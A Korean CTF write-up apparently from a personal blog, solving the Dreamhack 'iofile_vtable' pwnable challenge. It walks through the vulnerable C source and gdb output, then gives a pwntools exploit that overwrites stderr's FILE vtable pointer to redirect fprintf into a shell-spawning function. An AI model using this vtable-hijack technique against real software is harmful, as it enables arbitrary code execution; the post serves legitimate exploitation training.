---
published: true
image: /img
layout: post
title: "[Dreamhack] PWN iofile_vtable"
excerpt: "드림핵 포너블 iofile_vtable 문제풀이"
tags: [Dreamhack, pwnable, wargame, writeup]
math: true
date: 2023-03-13 12:00
---

이번 문제는 iofile의 vtable에 관한 문제이다. 문제 환경을 보면 ubuntu:16.04로 iofile vtable check 함수는 걱정하지 않아도 될듯 하다.

우선 바이너리 코드를 살펴보자.

```c++
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

char name[8];
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

void get_shell() {
    system("/bin/sh");
}
int main(int argc, char *argv[]) {
    int idx = 0;
    int sel;

    initialize();

    printf("what is your name: ");
    read(0, name, 8);
    while(1) {
        printf("1. print\n");
        printf("2. error\n");
        printf("3. read\n");
        printf("4. chance\n");
        printf("> ");

        scanf("%d", &sel);
        switch(sel) {
            case 1:
                printf("GOOD\n");
                break;
            case 2:
                fprintf(stderr, "ERROR\n");
                break;
            case 3:
                fgetc(stdin);
                break;
            case 4:
                printf("change: ");
                read(0, stderr + 1, 8);
                break;
            default:
                break;
            }
    }
    return 0;
}
```

우선 중점을 봐야할 부분은 두 부분 같다. 먼저 what is your name이라는 문구와 함께 read함수를 통해서 값을 8 만큼 입력 받는 다 이후 4번 항목을 통해서 stderr+1 지점에 8만큼 값을 쓸 수 있다. 

우선 stderr+1에 무엇이 있는지 gdb를 통해서 봐야 할 것 같다. gdb를 통해 살펴본 어셈블리는 다음과 같다.
```c++
   0x400a66 <main+267>    mov    rax, qword ptr [rip + 0x200653] <stderr@@GLIBC_2.2.5>
   0x400a6d <main+274>    add    rax, 0xd8
   0x400a73 <main+280>    mov    edx, 8
 ► 0x400a78 <main+285>    mov    rsi, rax                      <_IO_2_1_stderr_+216>
   0x400a7b <main+288>    mov    edi, 0
   0x400a80 <main+293>    call   read@plt                      <read@plt>
```
stderr에서 0xd8만큼 더한 값을 read함수의 파라미터로 사용하고 있다 0xd8은 어딘가 익숙한 값이다. 이 부분을 확인해보자.

```c++
pwndbg> x/gx 0x7ffff7dd2618
0x7ffff7dd2618 <_IO_2_1_stderr_+216>:   0x00007ffff7dd06e0
pwndbg> x/32gx 0x00007ffff7dd06e0
0x7ffff7dd06e0 <_IO_file_jumps>:        0x0000000000000000      0x0000000000000000
0x7ffff7dd06f0 <_IO_file_jumps+16>:     0x00007ffff7a869d0      0x00007ffff7a87740
0x7ffff7dd0700 <_IO_file_jumps+32>:     0x00007ffff7a874b0      0x00007ffff7a88610
0x7ffff7dd0710 <_IO_file_jumps+48>:     0x00007ffff7a89990      0x00007ffff7a861f0
0x7ffff7dd0720 <_IO_file_jumps+64>:     0x00007ffff7a85ed0      0x00007ffff7a854d0
0x7ffff7dd0730 <_IO_file_jumps+80>:     0x00007ffff7a88a10      0x00007ffff7a85440
0x7ffff7dd0740 <_IO_file_jumps+96>:     0x00007ffff7a85380      0x00007ffff7a7a190
0x7ffff7dd0750 <_IO_file_jumps+112>:    0x00007ffff7a861b0      0x00007ffff7a85b80
0x7ffff7dd0760 <_IO_file_jumps+128>:    0x00007ffff7a85980      0x00007ffff7a85350
0x7ffff7dd0770 <_IO_file_jumps+144>:    0x00007ffff7a85b70      0x00007ffff7a89b00
0x7ffff7dd0780 <_IO_file_jumps+160>:    0x00007ffff7a89b10      0x0000000000000000
0x7ffff7dd0790: 0x0000000000000000      0x0000000000000000
0x7ffff7dd07a0 <_IO_str_jumps>: 0x0000000000000000      0x0000000000000000
0x7ffff7dd07b0 <_IO_str_jumps+16>:      0x00007ffff7a89fb0      0x00007ffff7a89c90
0x7ffff7dd07c0 <_IO_str_jumps+32>:      0x00007ffff7a89c30      0x00007ffff7a88610
0x7ffff7dd07d0 <_IO_str_jumps+48>:      0x00007ffff7a89f90      0x00007ffff7a88640

pwndbg> p _IO_file_jumps
$5 = {
  __dummy = 0,
  __dummy2 = 0,
  __finish = 0x7ffff7a869d0 <_IO_new_file_finish>,
  __overflow = 0x7ffff7a87740 <_IO_new_file_overflow>,
  __underflow = 0x7ffff7a874b0 <_IO_new_file_underflow>,
  __uflow = 0x7ffff7a88610 <__GI__IO_default_uflow>,
  __pbackfail = 0x7ffff7a89990 <__GI__IO_default_pbackfail>,
  __xsputn = 0x7ffff7a861f0 <_IO_new_file_xsputn>,
  __xsgetn = 0x7ffff7a85ed0 <__GI__IO_file_xsgetn>,
  __seekoff = 0x7ffff7a854d0 <_IO_new_file_seekoff>,
  __seekpos = 0x7ffff7a88a10 <_IO_default_seekpos>,
  __setbuf = 0x7ffff7a85440 <_IO_new_file_setbuf>,
  __sync = 0x7ffff7a85380 <_IO_new_file_sync>,
  __doallocate = 0x7ffff7a7a190 <__GI__IO_file_doallocate>,
  __read = 0x7ffff7a861b0 <__GI__IO_file_read>,
  __write = 0x7ffff7a85b80 <_IO_new_file_write>,
  __seek = 0x7ffff7a85980 <__GI__IO_file_seek>,
  __close = 0x7ffff7a85350 <__GI__IO_file_close>,
  __stat = 0x7ffff7a85b70 <__GI__IO_file_stat>,
  __showmanyc = 0x7ffff7a89b00 <_IO_default_showmanyc>,
  __imbue = 0x7ffff7a89b10 <_IO_default_imbue>
}
```

확인한 결과 _IO_file_jumps vtable인 것을 볼수 있다. read(0, stderr + 1, 8); 구문을 통해서 가짜 vtable 주소를 넣어 원하는 함수를 실행 시킬 수 있을 것 같다.



case 2:의 fprintf()함수는 호출되면 _IO_file_jumps의 0x38 offset에 있는 __xsputn의 주소를 호출한다. 따라서 우리는 name 변수에 get_shell() 함수 주소를, case 4의 read 함수에서 name 변수 주소 -0x38을 입력하면 익스플로잇이 가능 할 것이다.

다음은 위 내용을 바탕으로 작성한 익스플로잇 코드이다.

```python
from pwn import *
context.update(arch='amd64', os='linux')
#context.log_level = 'debug'

p = remote("host3.dreamhack.games", 10623);
#p = process("./rop", env={'LD_PRELOAD':'./libc-2.27.so'})
#p = process("./iofile_vtable")
elf = ELF("./iofile_vtable")
#libc = ELF("./libc-2.27.so")

get_shell = 0x40094a
fake__xsputn = 0x6010d0-0x38

p.sendlineafter(b"what is your name: ", p64(get_shell))
pause()

p.sendlineafter(b"> ", b"4")
p.sendlineafter(b"change: ", p64(fake__xsputn))
p.sendlineafter(b"> ", b"2")

p.interactive()
```
